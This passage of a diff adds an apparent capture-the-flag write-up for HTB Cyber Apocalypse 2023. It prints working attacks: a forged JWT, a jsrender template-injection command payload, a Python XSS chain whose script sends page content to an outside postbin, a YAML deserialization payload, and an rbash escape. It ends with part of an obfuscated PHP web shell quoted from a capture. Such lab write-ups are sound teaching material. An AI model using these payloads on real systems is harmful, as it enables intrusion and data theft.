+                        .catch(err =&gt; reject(new GraphQLError(err)));
+                });
+            }
+        }</code></pre><figure><img src="../assets/images/htb/cyber-apocalypse-2023/05-untitled-4.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}</p>
+</div>
+</details>
+
+<details>
+<summary>Didactic Octo Paddles</summary>
+<div class="inner">
+<blockquote>You have been hired by the Intergalactic Ministry of Spies to retrieve a powerful relic that is believed to be hidden within the small paddle shop, by the river. You must hack into the paddle shop's system to obtain information on the relic's location. Your ultimate challenge is to shut down the parasitic alien vessels and save humanity from certain destruction by retrieving the relic hidden within the Didactic Octo Paddles shop.</blockquote><p>There is a flaw in checking if the user is admin. If the user provides a jwt token with alg that is not “none” or “HS256” the site will verify the jwt token with an empty key.<br>By forging a malicious jwt token you can gain admin rights:</p><pre><code>{"alg":"nOnE","typ":"JWT"}{"id":1,"iat":1679188479,"exp":1679192079}</code></pre><p>I changed the id to 1 (admin) and made the alg none but not all lowercase because the program only checks for all lowercase.</p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/06-untitled-5.png" alt=""></figure><p>Now that we have admin privileges, we need to check what we can do with it.</p><p>This is the only endpoint i see, this shows all the users the site has.<br>This had a big flaw. it is vulnerable for template injection in jsrender.templates.<br>To exploit this we need to register a new user with a specific payload:</p><pre data-lang="jsx"><code>{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat \/flag.txt').toString()\")()}}</code></pre><figure><img src="../assets/images/htb/cyber-apocalypse-2023/07-untitled-6.png" alt=""></figure><p>Going back to <code>/admin</code> shows the flag.</p><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}</p>
+</div>
+</details>
+
+<details>
+<summary>SpyBug</summary>
+<div class="inner">
+<blockquote>As Pandora made her way through the ancient tombs, she received a message from her contact in the Intergalactic Ministry of Spies. They had intercepted a communication from a rival treasure hunter who was working for the alien species. The message contained information about a digital portal that leads to a software used for intercepting audio from the Ministry's communication channels. Can you hack into the portal and take down the aliens counter-spying operation?</blockquote><p><a href="../assets/files/htb/cyber-apocalypse-2023/web_spybug.rar" download="">web_spybug.rar</a> <span class="att-note">(challenge file)</span></p><p>This one was quite complex, the site had multiple vulnerabilities you need to chain to get the flag. I will go over all of them and then chain them together.</p><details><summary><h3>The goal</h3></summary><div class="inner"><p>We need to get access to the panel as admin. This will show us the flag<br>I noticed that the server has an admin bot that goes to panel every minute.</p><pre data-lang="jsx"><code>router.get("/panel", authUser, async (req, res) =&gt; {
+  res.render("panel", {
+    username:
+      req.session.username === "admin"
+        ? process.env.FLAG
+        : req.session.username,
+    agents: await getAgents(),
+    recordings: await getRecordings(),
+  });
+});</code></pre>
+</div>
+</details><details>
+<summary>File uploaded vulnerability</summary>
+<div class="inner">
+<p>This code checks if the file ends with .wav and has type audio/wave in the upload request. It also reads the file and checks if <code>52494646[a-z0-9]{8}57415645</code> is found. This is basically the magic byte of a wav file. The problem is that it doesn’t check if it's at the beginning. This can be exploited. The file is renamed and put in the  <code>./uploads</code> folder.</p><pre data-lang="jsx"><code>const storage = multer.diskStorage({
+  filename: (req, file, cb) =&gt; {
+    cb(null, uuidv4());
+  },
+  destination: (req, file, cb) =&gt; {
+    cb(null, "./uploads");
+  },
+});
+
+const multerUpload = multer({
+  storage: storage,
+  fileFilter: (req, file, cb) =&gt; {
+    if (
+      file.mimetype === "audio/wave" &amp;&amp;
+      path.extname(file.originalname) === ".wav"
+    ) {
+      cb(null, true);
+    } else {
+      return cb(null, false);
+    }
+  },
+});
+
+router.post(
+  "/agents/upload/:identifier/:token",
+  authAgent,
+  multerUpload.single("recording"),
+  async (req, res) =&gt; {
+    if (!req.file) return res.sendStatus(400);
+
+    const filepath = path.join("./uploads/", req.file.filename);
+    const buffer = fs.readFileSync(filepath).toString("hex");
+
+    if (!buffer.match(/52494646[a-z0-9]{8}57415645/g)) {
+      fs.unlinkSync(filepath);
+      return res.sendStatus(400);
+    }
+
+    await createRecording(req.params.identifier, req.file.filename);
+    res.send(req.file.filename);
+  }
+);</code></pre>
+</div>
+</details><details>
+<summary>XSS vulnerability</summary>
+<div class="inner">
+<p>This is the <code>panel.pug</code> file. This file is loaded when going to the <code>/panel</code> endpoint. This is loaded with all the agent info and uploads info. They use <code>!{var}</code> to protect for template injection but not for XSS. </p><pre data-lang="jsx"><code>router.post(
+  "/agents/details/:identifier/:token",
+  authAgent,
+  async (req, res) =&gt; {
+    const { hostname, platform, arch } = req.body;
+    if (!hostname || !platform || !arch) return res.sendStatus(400);
+    await updateAgentDetails(req.params.identifier, hostname, platform, arch);
+    res.sendStatus(200);
+  }
+);</code></pre><pre data-lang="html"><code>doctype html
+head
+	title Spybug | Panel
+	include head.pug
+body
+	div.container.login.mt-5.mb-5
+		div.row
+			div.col-md-10
+				h1
+					i.las.la-satellite-dish
+					| &amp;nbsp;Spybug v1
+			div.col-md-2.float-right
+				a.btn.login-btn.mt-3(href="/panel/logout") Log-out
+		hr
+		h2 #{"Welcome back " + username}
+		hr
+		h3
+			i.las.la-laptop
+			| &amp;nbsp;Agents
+		if agents.length &gt; 0
+			table.w-100
+				thead
+					tr
+					th ID
+					th Hostname
+					th Platform
+					th Arch
+				tbody
+					each agent in agents
+						tr
+							td= agent.identifier
+							td !{agent.hostname}
+							td !{agent.platform}
+							td !{agent.arch}
+		else
+			h2 No agents
+
+		hr
+		h3
+			i.las.la-play-circle
+			| &amp;nbsp;Recordings
+		if recordings.length &gt; 0
+			table.w-100
+				thead
+					tr
+					th Agent ID
+					th Audio
+				tbody
+					each recording in recordings
+						tr
+							td= recording.agentId
+							td
+								audio(controls='')
+									source(src=recording.filepath)
+		else
+			h2 No recordings</code></pre>
+</div>
+</details><details>
+<summary>Content security</summary>
+<div class="inner">
+<p>The <code>/panel</code> endpoint has a header Content-Security. The important one is the <code>script-src ‘self’</code>. This only allows script tags with script src of its own domain. This is going to be used later.</p><pre><code>Content-Security-Policy: script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';</code></pre>
+</div>
+</details><details>
+<summary>Full exploit explained</summary>
+<div class="inner">
+<ol><li>First step we will register an agent.</li>
+<li>We craft a malicious file containing js that ends with the magic bytes of a wav file and name it file.wav. Put the link in the fetch request to where you want the flag to be send to. (postbin)<br>We comment out the magic byte so it doesn’t give errors.<br>Upload the file to <code>/agents/upload/identifier/token</code> .<br>Save the id you get back for the next part.<pre><code>// file.wav
+
+window.addEventListener("DOMContentLoaded", (event) =&gt; {
+    let flag = document.querySelector("h2").textContent;
+    fetch("{postBinLink}?flag="+flag);
+});/*RIFF/* WAVE*/</code></pre></li>
+<li>Now we will send a XSS payload to <code>/agents/details/identifier/token </code> .<br>Here we put in a script tag with as src the file that we have uploaded.<br>This bypasses the content security because the js comes from its own domain.<pre><code>{
+        "hostname": "RANDOM",
+        "platform": "RANDOM",
+        "arch": "&lt;script src='/uploads/{fileId}'&gt;&lt;/script&gt;"
+}</code></pre></li>
+<li>Now we wait. Because there is a bot on the server that goes to the panel every minute.<br>So check your postbin in a minute.<pre><code>createAdmin();
+setInterval(visitPanel, 60000);</code></pre></li></ol>
+</div>
+</details><details>
+<summary>Full exploit script</summary>
+<div class="inner">
+<p>I made a script that does all of this automatically.</p><pre data-lang="python"><code>import requests
+import json
+
+# Config
+ip = "142.93.38.14"
+port = 32286
+postBinLink = "https://www.toptal.com/developers/postbin/1679434525677-7056008977815" # Put own postebin
+
+baseUrl = f"http://{ip}:{port}"
+
+
+
+def registerAgent():
+    print("[*] Registering agent")
+    jsonData = requests.get(baseUrl+"/agents/register").json()
+    identifier = jsonData["identifier"]
+    token = jsonData["token"]
+    return identifier, token
+
+def uploadFile(id, token):
+    print("[*] Uploading file payload")
+    global postBinLink
+    filePayload = 'window.addEventListener("DOMContentLoaded", (event) =&gt; {\r\n    let flag = document.querySelector("h2").textContent;\r\n    fetch("'+postBinLink+'?flag="+flag);\r\n});/*RIFF/*\x16 WAVE*/'
+
+    payload = {}
+    files = [
+        ('recording', ('file.wav', filePayload.encode(), 'audio/wave'))
+    ]
+
+    response = requests.request("POST", f"{baseUrl}/agents/upload/{id}/{token}", data=payload, files=files)
+
+    return response.text
+
+def xssPayload(id, token, fileId):
+    print("[*] Sending XSS payload")
+    payload = {
+        "hostname": "RANDOM",
+        "platform": "RANDOM",
+        "arch": f"&lt;script src='/uploads/{fileId}'&gt;&lt;/script&gt;"
+    }
+
+    response = requests.request("POST", f"{baseUrl}/agents/details/{id}/{token}", data=payload)
+    if response.text == "OK":
+        print("[*] Check postbin in a minute")
+    else:
+        print("[!] FAILED")
+
+
+def main():
+    id, token = registerAgent()
+    fileId = uploadFile(id, token)
+    xssPayload(id, token, fileId)
+
+
+
+main()</code></pre>
+</div>
+</details><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{p01yg10t5_4nd_35p10n4g3}</p></div></details>
+
+<h2>Reverse</h2>
+
+<details>
+<summary>Shattered tablet</summary>
+<div class="inner">
+<p><a href="../assets/files/htb/cyber-apocalypse-2023/tablet.txt" download="">tablet</a> <span class="att-note">(challenge file)</span></p><details><summary>Open in Ghidra, browse to main function</summary><div class="inner"><pre><code>/* WARNING: Could not reconcile some variable overlaps */
+
+undefined8 main(void)
+
+{
+  undefined8 local_48;
+  undefined8 local_40;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  undefined8 local_20;
+  undefined8 local_18;
+  undefined8 local_10;
+
+  local_48 = 0;
+  local_40 = 0;
+  local_38 = 0;
+  local_30 = 0;
+  local_28 = 0;
+  local_20 = 0;
+  local_18 = 0;
+  local_10 = 0;
+  printf("Hmmmm... I think the tablet says: ");
+  fgets((char *)&amp;local_48,0x40,stdin);
+  if (((((((((local_30._7_1_ == 'p') &amp;&amp; (local_48._1_1_ == 'T')) &amp;&amp; (local_48._7_1_ == 'k')) &amp;&amp;
+          ((local_28._4_1_ == 'd' &amp;&amp; (local_40._3_1_ == '4')))) &amp;&amp;
+         ((local_38._4_1_ == 'e' &amp;&amp; ((local_40._2_1_ == '_' &amp;&amp; ((char)local_48 == 'H')))))) &amp;&amp;
+        (local_28._2_1_ == 'r')) &amp;&amp;
+       ((((local_28._3_1_ == '3' &amp;&amp; (local_30._1_1_ == '_')) &amp;&amp; (local_48._2_1_ == 'B')) &amp;&amp;
+        (((local_30._5_1_ == 'r' &amp;&amp; (local_48._3_1_ == '{')) &amp;&amp;
+         ((local_30._2_1_ == 'b' &amp;&amp; ((local_48._5_1_ == 'r' &amp;&amp; (local_40._5_1_ == '4')))))))))) &amp;&amp;
+      (((local_30._6_1_ == '3' &amp;&amp;
+        (((local_38._3_1_ == 'v' &amp;&amp; (local_40._4_1_ == 'p')) &amp;&amp; (local_28._1_1_ == '1')))) &amp;&amp;
+       (((local_30._3_1_ == '3' &amp;&amp; (local_38._1_1_ == 'n')) &amp;&amp;
+        (((local_48._4_1_ == 'b' &amp;&amp; (((char)local_28 == '4' &amp;&amp; (local_40._1_1_ == 'n')))) &amp;&amp;
+         ((char)local_38 == ',')))))))) &amp;&amp;
+     ((((((((char)local_40 == '3' &amp;&amp; (local_48._6_1_ == '0')) &amp;&amp; (local_38._7_1_ == 't')) &amp;&amp;
+         ((local_40._7_1_ == 't' &amp;&amp; ((char)local_30 == '0')))) &amp;&amp;
+        ((local_40._6_1_ == 'r' &amp;&amp; ((local_28._5_1_ == '}' &amp;&amp; (local_38._5_1_ == 'r')))))) &amp;&amp;
+       (local_38._6_1_ == '_')) &amp;&amp; ((local_38._2_1_ == '3' &amp;&amp; (local_30._4_1_ == '_')))))) {
+    puts("Yes! That\'s right!");
+  }
+  else {
+    puts("No... not that");
+  }
+  return 0;
+}</code></pre>
+</div>
+</details><p>⇒ This reveals a check on a lot of characters, if u follower the order from the variable initialization at the top:</p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/08-untitled-7.png" alt=""></figure><p>and rearrange the characters this way, you get the flag: <code>{br0k3n_4p4rt,n3ver_t0_b3_r3p41r3d}</code></p></div></details>
+
+<h2>Misc</h2>
+
+<details>
+<summary>Persistence</summary>
+<div class="inner">
+<blockquote>Thousands of years ago, sending a GET request to <strong>/flag </strong>would grant immense power and wisdom. Now it's broken and usually returns  random data, but keep trying, and you might get lucky... Legends say it works once every 1000 tries.</blockquote><p>Simple python script that keeps sending requests until the flag is found:</p><pre><code>import requests
+
+url = 'http://159.65.62.241:30757/flag'
+flag = ''
+while not flag.startswith('HTB'):
+    response = requests.get(url)
+    flag = response.text.strip()
+    print(f'Response: {flag}')</code></pre><figure><img src="../assets/images/htb/cyber-apocalypse-2023/09-untitled-8.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → <mark class="highlight-yellow_background" data-notion-highlight="yellow_background">HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}</mark></p>
+</div>
+</details>
+
+<details>
+<summary>Hijack</summary>
+<div class="inner">
+<blockquote>The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. Can you take advantage of the situation without raising any suspicion?</blockquote><pre><code>&lt;------[TCS]------&gt;
+[1] Create config
+[2] Load config
+[3] Exit
+&gt; 1
+
+- Creating new config -
+Temperature units (F/C/K): K
+Propulsion Components Target Temperature : 1273
+Solar Array Target Temperature : 303
+Infrared Spectrometers Target Temperature : 170
+Auto Calibration (ON/OFF) : ON
+
+Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxNzAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzEyNzMnLCBzb2xhcl9hcnJheV90ZW1wOiAnMzAzJywgdW5pdHM6IEt9Cg==
+Uploading to ship...
+
+
+&lt;------[TCS]------&gt;
+[1] Create config
+[2] Load config
+[3] Exit
+&gt; 2
+
+Serialized config to load: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxNzAnLCBhdXRvX2NhbGlicmF0aW9uOiAnT04nLAogIHByb3B1bHNpb25fdGVtcDogJzEyNzMnLCBzb2xhcl9hcnJheV90ZW1wOiAnMzAzJywgdW5pdHM6IEt9Cg==
+
+Unable to load config!</code></pre><p>After decoding the serialized data we can find this:</p><pre><code>!!python/object:__main__.Config {IR_spectrometer_temp: '1', auto_calibration: 'ON',
+  propulsion_temp: '100', solar_array_temp: '200', units: C}</code></pre><p>This is serialized yaml data in python. Now we know that this program is vulnerable to insecure deserialization. <br>We can craft a payload with the following python script:</p><pre><code>import yaml
+import subprocess
+import base64
+class Payload(object):
+    def __reduce__(self):
+        return (subprocess.Popen,(['cat', 'flag.txt'],))
+
+deserialized_data = yaml.dump(Payload()) # serializing data
+print(deserialized_data)
+print(base64.b64encode(deserialized_data.encode('ascii')).decode())</code></pre><p>Now ask the program to load the payload as config.</p><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}</p>
+</div>
+</details>
+
+<details>
+<summary>Restricted</summary>
+<div class="inner">
+<blockquote>You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment ?</blockquote><p>I noticed that when you want to ssh into the environment, you get access to a restricted shell (/bin/rbash)<br>We can bypass this by adding -t “bash -noprofile” like this:</p><pre><code>ssh restricted@159.65.94.38 -p 31868 -t "bash --noprofile"</code></pre><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{r35tr1ct10n5_4r3_p0w3r1355}</p>
+</div>
+</details>
+
+<details>
+<summary>Remote computation</summary>
+<div class="inner">
+<blockquote>The alien species use remote machines for all their computation needs. Pandora managed to hack into one, but broke its functionality in the process. Incoming computation requests need to be calculated and answered rapidly, in order to not alarm the aliens and ultimately pivot to other parts of their network. Not all requests are valid though, and appropriate error messages need to be sent depending on the type of error. Can you buy us some time by correctly responding to the next 500 requests?</blockquote><p>The program ask 500 questions where you need to answer to fast.</p><p>This is the script i made:</p><figure><pre data-lang="python"><code>r = remote("144.126.196.198",31941)
+
+r.recvuntil(b"&gt; ")
+
+r.sendline(b"1")
+
+for i in range(500):
+        out = r.recvuntil(b"&gt; ").decode()
+        lines = out.split("\n")
+        for line in lines:
+                if line.startswith("[") and not line.startswith("[*]"):
+                        mathPart = line.strip()[7:-4]
+                        print(mathPart)
+                        break
+        try:
+                outcome = round(eval(mathPart),2)
+                print(f"{mathPart} = {outcome}")
+                if float(outcome) &lt; -1337 or float(outcome) &gt; 1337:
+                        r.sendline(b"MEM_ERR")
+                        print("MEM")
+                else:
+                        r.sendline(str(outcome).encode())
+        except ZeroDivisionError:
+                r.sendline(b"DIV0_ERR")
+                print("DIV_ERR")
+        except SyntaxError:
+                r.sendline(b"SYNTAX_ERR")
+                print("SYNTAX_ERR")
+
+r.interactive()
+</code></pre><figcaption>Note: only use this script on servers you know are safe because it uses eval to do the math questions.</figcaption></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{d1v1d3_bY_Z3r0_3rr0r}</p>
+</div>
+</details>
+
+<details>
+<summary>Janken</summary>
+<div class="inner">
+<blockquote>As you approach an ancient tomb, you're met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there's a catch: you must win 100 rounds in a row to pass. Fail to do so, and you'll be denied entry.</blockquote><p>There is a bug on how the input and the right answer is compared.<br>It uses the following function to compare:</p><pre data-lang="c"><code>strstr(userInput, rightInput)</code></pre><p>This checks if the <code>rightInput</code> is a substring of <code>userInput</code>.</p><p>So by inputting “rockpaperscissors” this function will always return true.<br>I made a script to automate this:</p><pre data-lang="python"><code>from pwn import *
+
+r = remote("165.232.98.11", 31563)
+
+r.recvuntil(b"&gt;&gt; ")
+
+r.sendline(b"1")
+
+for i in range(99):
+        out = r.recvuntil(b"&gt;&gt; ").decode()
+        print(out)
+        r.sendline(b"rockpaperscissors")
+
+
+r.interactive()</code></pre><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}</p>
+</div>
+</details>
+
+<h2>Forensics</h2>
+
+<details>
+<summary>Plaintext Treasure</summary>
+<div class="inner">
+<blockquote>Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server's administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.</blockquote><p>Saw post request to /token → Follow TCP steam</p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/10-untitled-9.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag</strong></mark> → <mark class="highlight-yellow_background" data-notion-highlight="yellow_background">HTB{th3s3_4l13ns_st1ll_us3_HTTP}</mark></p>
+</div>
+</details>
+
+<details>
+<summary>Alien Cradle</summary>
+<div class="inner">
+<blockquote>In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora's close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?</blockquote><p><code>cradle.ps1</code> <span class="att-note">(attachment not included in the export)</span></p><figure><img src="../assets/images/htb/cyber-apocalypse-2023/11-untitled-10.png" alt=""></figure><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag </strong></mark>→ <mark class="highlight-yellow_background" data-notion-highlight="yellow_background">HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}</mark></p>
+</div>
+</details>
+
+<details>
+<summary>Extraterrestrial Persistence</summary>
+<div class="inner">
+<blockquote>There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?</blockquote><p><a href="../assets/files/htb/cyber-apocalypse-2023/persistence.sh" download="">persistence.sh</a> <span class="att-note">(challenge file)</span></p><p>Found base64 encoded string in the script, decode with cyberchef. it’s a systemd service:</p><pre><code>[Unit]
+Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
+After=network.target network-online.target
+
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+
+ExecStart=/usr/local/bin/service
+ExecStop=/usr/local/bin/service
+
+[Install]
+WantedBy=multi-user.target</code></pre><p><mark class="highlight-teal" data-notion-highlight="teal"><strong>Flag </strong></mark>→ <mark class="highlight-yellow_background" data-notion-highlight="yellow_background">HTB{th3s3_4l13nS_4r3_s00000_b4s1c}</mark></p>
+</div>
+</details>
+
+<details>
+<summary>Roten (solved)</summary>
+<div class="inner">
+<blockquote>The iMoS is responsible for collecting and analyzing targeting data across various galaxies. The data is collected through their webserver, which is accessible to authorized personnel only. However, the iMoS suspects that their webserver has been compromised, and they are unable to locate the source of the breach. They suspect that some kind of shell has been uploaded, but they are unable to find it. The iMoS have provided you with some network data to analyse, its up to you to save us.</blockquote><ul><li>Analyzed using networkminer</li><li>Sort on sent packets → found host with a lot of sent packets</li><li>filter on ip in wireshark → <code>ip.src eq 146.70.38.48</code><figure><img src="../assets/images/htb/cyber-apocalypse-2023/12-untitled-11.png" alt=""></figure></li><li>Suspicious GET request<figure><img src="../assets/images/htb/cyber-apocalypse-2023/13-untitled-12.png" alt=""></figure></li><li>ls command</li><li>can open html files via networkminer → same output</li><li>(earlier) fuzzing scan from same IP<figure><img src="../assets/images/htb/cyber-apocalypse-2023/14-untitled-13.png" alt=""></figure></li><li>TCP Stream 173 → POST of weird obfuscated php script..<pre><code>&lt;?php
+$pPziZoJiMpcu = 82;
+$liGBOKxsOGMz = array();
+$iyzQ5h8qf6 = "" ;
+$iyzQ5h8qf6 .= "&lt;nnyo ea\$px-aloerl0=e r\$0' weme Su rgsr s\"eu&gt;\"e'Er= elmi)y ]_'t&gt;bde e e  =p   xt\" ?ltps vdfic-xetrmsx'l0em0  o\"oc&amp;'t [r\"e _e;eV.ncxm'vToil   ,F y";
+$iyzQ5h8qf6 .= "&lt;r s -&lt;a  \"op r_P&lt; poeeihaeild /ds\"se4bsxao1: r]du ;e\$'o,t dn\n)i\$'me'maoate{e  I!lb&gt;'u btde .sr ege/ han:t";
+$iyzQ5h8qf6 .= "elrlenjl t&gt;( 0'eCdd0  l et0\n'seu u it ;e_ dc&gt;ulUd'T\nxe\$L&lt;er&lt;.l oh&gt;c  ii aert pdt iai(ed.QiJr\n\$i0; 0\"e0' d= ex ].xp\$r re \nwSn'u&lt;lup ]o iluE/=&gt;b\$t r&gt;\n";
+$iyzQ5h8qf6 .= "h rxn ltmb \n'-aodd') bubaa\nff0 i0] )- [ &amp;\"4 ==e[wn (r #iEa tftelF)U sspSb\"'rd  dO o e_t ppso \n]DpneaC;aoesvp\ni( }f0 &amp; ' \"( ]0 =sc'o  \$s #nRmaeoi=oi)p te";
+$iyzQ5h8qf6 .= "l[&gt;c;&gt;ia ew   agP aw(d i;ep:rto\nnor/a/&lt;l )\n( = ?;\$r\$0 0 'puwr\$\$d\" fgVeu'rp'al l s o'&lt;o\n&lt;rs rn \" leeetu\$y f\nsl (en dtyjS3?e\$   ) 0 \ngem0=  xrtrlsdi; l E=t&gt;ma\"d";
+$iyzQ5h8qf6 .= "e{o  iafbl\nb. }ee &lt; ptrchid&gt;   cia''t  s qc.p)m{ \$ (0' rao0 ) 'ieid;ir\n adR'o\\ r.''\na ifdiro &gt;'\$\ndr&lt;t apmh(di\" ( rctE)";
+$iyzQ5h8qf6 .= "e mtlur3h;o  m{\$2x odd0(  )n't[\nr)  gi[dcnat\$   d n Dl&gt;r R k}\"&lt;tr twso\$(r; i iatx;n iriei.p\nd\$ o m0' u\"e1\$\$ ";
+$iyzQ5h8qf6 .= " t]e'} ) } r'io\"c/_in '  (ie': e&amp;e\n&gt;/b&gt; hu( df)\n s ptap\nt nabrp6\n et d\$o0  p] )ogi?f)'r\n=  \n=ePrm;tfGda";
+$iyzQ5h8qf6 .= " ]e\"mrT;r s&amp;ye\nto\" (i\$\"ii e s tici - ipryt/\n  y etd): [ &amp; wrf (;]e\n {   cH'p\nioE=m [c.oeo\ne u  c hd; \$dd&lt;rl.c e iohr L fca/ jf &amp;p  ye   ";
+$iyzQ5h8qf6 .= "\"= ?no('\"\n,a\n\$\n  HtP leorT'e 'h\$vcU d l'=h &gt;y\n d(it.e h t onme e idr1-su  e &amp;p ?' e 0 eu t%  d\$_   To_vecnm[f= nouetp \" t.";
+$iyzQ5h8qf6 .= "&gt;o \n&gt; eifrd'o\"o ( n/es n eny.-/n 0=e e&amp; - x(0'rp\$'1 \$'dP   BrSath=-'i' a p_ol &gt;  \$    \n cri)&gt;/w&lt;  \$i:on: g ";
+$iyzQ5h8qf6 .= "d. 1&gt;bc x'l0= ''\$e\$0x[[m s g]iO   {yEleo'ddls m\"luro E}o_\$\"&lt; &lt; h.l &lt;'n/\" _f ct  t  c-2\not 2dsx'0w;gcm0''\"o:% r,rS   W Lu= \"aieu\$e&lt;opya r\nfG";
+$iyzQ5h8qf6 .= "v&lt;t ? o'e.a.et&lt; G Ft;0 h Co-.&lt;oi 0'eAs0'\nruo2 eed 1 o  T   0\"Fe'\".trTbu'bal)d r\n Eabh p  /o  \$rd/ E(ie ' :eSm&gt;2stoi0; 0'4  otd):xxe's u\$=[ ";
+$iyzQ5h8qf6 .= "  w '=o&lt;\$a'omp]rdo)' o}cTlre h \"'w\"hv(&gt;t Tfltf)  xS/\n/csnf0 i0;0: uee  ee T% pw '  \$_.]\"f/_']Uil)&gt;Da ] r\no[u&gt;a p &lt;.n&lt;ra\$\\a [ie-i; 'i b&lt;jrt ( }f0 0  ";
+$iyzQ5h8qf6 .= "p\" ?'cc&amp;'1 [o\$d  dR ..ffS&gt;.pto;&lt;id{[} \nm'e\"d \n t\$e/eldnb 'l sl\n  t-osqirp )\n( })' []&amp; -uu ;s\$'r_ii iO\$\"\$'oE";
+$iyzQ5h8qf6 .= "\\\"l'a\nbre\n' uimc);&gt; fidvrtfui\"l deTte  .;-ocupar\$   )\n - \"  ''tt0\n\"selGrf rtd'd rRn'o&gt;d red nepfam \n\n&lt;o";
+$iyzQ5h8qf6 .= "f&gt;a(d=er;e o_rrn h \n&gt;tretpim{ \$  ?' w=0w;eex ,.xdE'   _i iamV\"/a\"D &gt;c_ all nd{? tr &lt;l\$&gt;').\n&gt; weaea ef \nsir .no  ";
+$iyzQ5h8qf6 .= "m{  ; r 0'\n'\"2  =e[T](\$=Armru&gt;E;&gt;d;i &lt;tf mso(d'\n&gt; he(aud\\\" ' \" nxnam ai &lt;tpysmtd\$ o  '\n i(0  ]]0 \$sc'[;if _ e.t\"R\n '\nr boi eeai ] \n &gt;ai ein../ ; lisme ";
+$iyzQ5h8qf6 .= "dl lrt.riPet d\$ r \$t\$0: = 0 opuw'\nsi'D.t\"o;[e\"&gt;ee  rl ' dse, \n Pcsh)r\"  ' \n osf'= ee ia mcne y et ' gem4  ==  wrtrd}_l.a h f\n'c;\\cc sye ]{isx  &lt;";
+$iyzQ5h8qf6 .= " eh_r .;\$\". \n ate)\" rs npsi=.r&amp;p  y   r\"o)' ' ) nieii\nfe/Y\"o/oePh\nnht t.( .\nnee\$ t r de.'\n_'\$ \n dsr;' (i k/rn\"jm e &amp;p : o]d - x(  en'tr\$i '}&lt;d&gt;ccHoe&lt;o";
+$iyzQ5h8qf6 .= "o y\"\$ ' gtcc a&lt;m(if / S&gt;v ? '('\n. 'z  3c.hss0=e e   u e?' '\$\$ rt]e'fl=;\n/=\"uhP cb ril._    (um bti\$r=\"' E\"a &gt; ]\$) b Pe r.=jt\"(x'l0=e' p=  ; )gw\$[f)']ie \n\$h";
+$iyzQ5h8qf6 .= "';so_\"hr\"yfe&lt;F u f\$td lrsd('/. R.l \n )f; a r(}e3\"st&gt;\$1csx'l- [ &amp;'\n  ros'(;];l(\$}d2G\n&gt; S&lt;o&gt;&lt;  =/I p i_ir e&gt;sir\"'\$ V u}\n )i\n s a\$\nl.h\"p&lt;f0'e8l";
+$iyzQ5h8qf6 .= "s' \"( r i?or=r\"\n,\ne\$d\ni&gt;Ee\\\"Ei &lt;/=('bL l lGoe  \nire.&gt;v E\$e\n\n  l  ehgf}=6t&gt;:/i0; 0'e;\$r\$0' f ulse%  i di\$r\"Tcn\\Ln\"id fc&gt;E o eEns c osa \"a Rv) \n {e";
+$iyzQ5h8qf6 .= "  nemi\n\"/t&lt;/sl0 i0; \noem0  ('pdpa1 \$f=irds;'h&lt;nFp&lt;ni\$io&lt;S a  T:u l n l\$.l [a) &lt; \n)  aaal\nscp//ce }f0 \$ wao0:  s[[rds w  r;i \n&gt;o";
+$iyzQ5h8qf6 .= "i&lt;'uipvdll/[ d '[ l a sap_ u 'l[ /  )  md:e?tsssmr))\n( }t ndd1  \$''\"i'% o(')\nr=e\" nb]tnu&gt;ieob' e .'&lt;t s &lt;saS\$e}Pu";
